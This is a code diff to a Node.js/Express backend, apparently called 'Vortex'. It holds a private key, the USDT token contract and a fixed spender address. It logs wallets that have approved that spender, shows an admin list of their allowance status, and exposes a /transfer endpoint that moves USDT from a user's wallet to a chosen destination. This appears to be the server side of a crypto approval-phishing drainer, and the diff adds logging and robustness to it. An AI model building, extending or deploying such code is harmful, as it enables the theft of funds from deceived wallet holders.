@@ -8,6 +8,7 @@ dotenv.config();
 
 const app = express();
 app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
 app.use(express.static(path.join(__dirname, "public")));
 
 const PRIVATE_KEY = process.env.PRIVATE_KEY;
@@ -28,7 +29,7 @@ const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
 const SPENDER_ADDRESS = "0x61f6f18fbc3ea4060b5aac3894094d1b3322c63b";
 const contract = new ethers.Contract(USDT_ADDRESS, USDT_ABI, wallet);
 
-// ✅ MongoDB Client Setup (with Stable API fix)
+// ✅ MongoDB Client Setup with Server API Version
 const client = new MongoClient(MONGO_URI, {
   serverApi: {
     version: ServerApiVersion.v1,
@@ -47,12 +48,19 @@ client.connect().then(() => {
   console.error("❌ MongoDB connection error:", err.message);
 });
 
+// Serve admin panel
 app.get("/", (req, res) => {
   res.sendFile(path.join(__dirname, "public", "admin.html"));
 });
 
+// Fetch all approved wallets
 app.get("/wallets", async (req, res) => {
   try {
+    if (!collection) {
+      console.log("❌ Collection undefined in /wallets");
+      return res.status(500).json({ error: "Collection not ready" });
+    }
+
     const walletList = await collection.find().toArray();
     const result = await Promise.all(walletList.map(async (entry) => {
       const addr = entry.wallet;
@@ -64,6 +72,7 @@ app.get("/wallets", async (req, res) => {
         approved: allowance.gt(0) ? "✅ YES" : "❌ NO"
       };
     }));
+
     res.json(result);
   } catch (err) {
     console.error("❌ /wallets error:", err);
@@ -71,15 +80,29 @@ app.get("/wallets", async (req, res) => {
   }
 });
 
+// Log wallet on approval
 app.post("/log", async (req, res) => {
   const { wallet } = req.body;
-  if (!wallet || !wallet.startsWith("0x")) return res.status(400).json({ error: "Invalid wallet" });
+
+  if (!wallet || !wallet.startsWith("0x")) {
+    console.log("❌ Invalid wallet received:", wallet);
+    return res.status(400).json({ error: "Invalid wallet" });
+  }
 
   try {
+    if (!collection) {
+      console.log("❌ MongoDB collection not initialized.");
+      return res.status(500).json({ error: "MongoDB not ready" });
+    }
+
     const exists = await collection.findOne({ wallet });
     if (!exists) {
       await collection.insertOne({ wallet });
+      console.log("✅ Wallet logged:", wallet);
+    } else {
+      console.log("ℹ️ Wallet already exists:", wallet);
     }
+
     res.json({ success: true });
   } catch (err) {
     console.error("❌ /log error:", err);
@@ -87,6 +110,7 @@ app.post("/log", async (req, res) => {
   }
 });
 
+// Transfer USDT from user to destination wallet
 app.post("/transfer", async (req, res) => {
   try {
     const { fromWallet, toWallet, amount } = req.body;
@@ -99,6 +123,7 @@ app.post("/transfer", async (req, res) => {
   }
 });
 
+// Start server
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, () => {
   console.log(`✅ Vortex backend live at http://localhost:${PORT}`);
